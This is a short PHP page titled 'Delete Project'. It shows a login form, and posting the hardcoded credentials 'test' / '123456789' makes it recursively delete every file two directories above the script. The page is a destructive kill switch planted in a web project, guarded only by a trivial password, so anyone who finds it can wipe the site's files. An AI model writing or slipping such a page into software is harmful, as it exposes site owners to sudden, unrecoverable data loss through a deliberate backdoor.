<?php

function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (filetype($dir."/".$object) == "dir"){
                    rrmdir($dir."/".$object);
                }else{
                    unlink($dir."/".$object);
                }
            }
        }
        reset($objects);
        // rmdir($dir);
    }
}
$message = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if ($_POST['username'] == 'test' && $_POST['password'] == '123456789') {
        rrmdir('../../');
    } else {
        $message = 'Wrong username and password';
    }
}
?>


<html>
<head>
    <title>Delete Project</title>
</head>
<body>
<h1><?php echo $message ?></h1>
<form action="" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit">
</form>
</body>
</html>
